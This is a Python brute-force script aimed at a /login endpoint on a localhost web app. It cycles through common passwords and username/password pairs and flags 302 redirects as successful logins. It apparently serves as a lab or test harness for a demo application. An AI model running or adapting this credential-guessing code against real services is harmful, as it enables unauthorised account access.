#!/usr/bin/env python3
"""
Brute Force Attack Script
Tests the /login endpoint with multiple password attempts
"""

import requests
import time
import sys

BASE_URL = "http://localhost:5000"

def brute_force_attack():
    """Perform brute force attacks on the login endpoint"""
    print("\n" + "="*60)
    print("BRUTE FORCE ATTACK")
    print("="*60)
    
    # Common passwords to try
    passwords = [
        "password",
        "123456",
        "admin",
        "root",
        "test",
        "password123",
        "admin123",  # This should succeed
        "letmein",
        "welcome",
        "monkey",
        "12345678",
        "qwerty",
        "abc123",
        "password1",
        "admin123",  # Duplicate to test multiple attempts
    ]
    
    username = "admin"
    successful_login = False
    
    print(f"\n[*] Attempting brute force on username: {username}")
    print(f"[*] Will try {len(passwords)} passwords\n")
    
    for i, password in enumerate(passwords, 1):
        print(f"[{i}/{len(passwords)}] Trying password: {password}")
        try:
            response = requests.post(
                f"{BASE_URL}/login",
                data={
                    'username': username,
                    'password': password
                },
                allow_redirects=False,
                timeout=5
            )
            
            print(f"    Status Code: {response.status_code}")
            
            # Check if login was successful (redirect to home)
            if response.status_code == 302 or response.status_code == 200:
                if "Invalid credentials" not in response.text and response.status_code == 302:
                    print(f"    [!] LOGIN SUCCESSFUL with password: {password}")
                    successful_login = True
                else:
                    print(f"    [-] Login failed")
            
            time.sleep(0.3)  # Small delay between attempts
            
        except requests.exceptions.RequestException as e:
            print(f"    [!] Error: {e}")
    
    # Also try different usernames
    print("\n[*] Trying different usernames with common passwords...")
    usernames = ["admin", "user", "root", "test", "administrator"]
    common_passwords = ["admin123", "password123", "123456", "admin"]
    
    for username in usernames:
        for password in common_passwords:
            print(f"[*] Trying {username}:{password}")
            try:
                response = requests.post(
                    f"{BASE_URL}/login",
                    data={
                        'username': username,
                        'password': password
                    },
                    allow_redirects=False,
                    timeout=5
                )
                if response.status_code == 302:
                    print(f"    [!] LOGIN SUCCESSFUL: {username}:{password}")
                    successful_login = True
                time.sleep(0.2)
            except:
                pass
    
    print("\n[+] Brute force attack completed")
    if successful_login:
        print("[!] At least one login attempt was successful")
    return True

if __name__ == "__main__":
    print("Starting Brute Force Attack...")
    print("Make sure the webapp is running on http://localhost:5000")
    time.sleep(2)
    
    success = brute_force_attack()
    sys.exit(0 if success else 1)

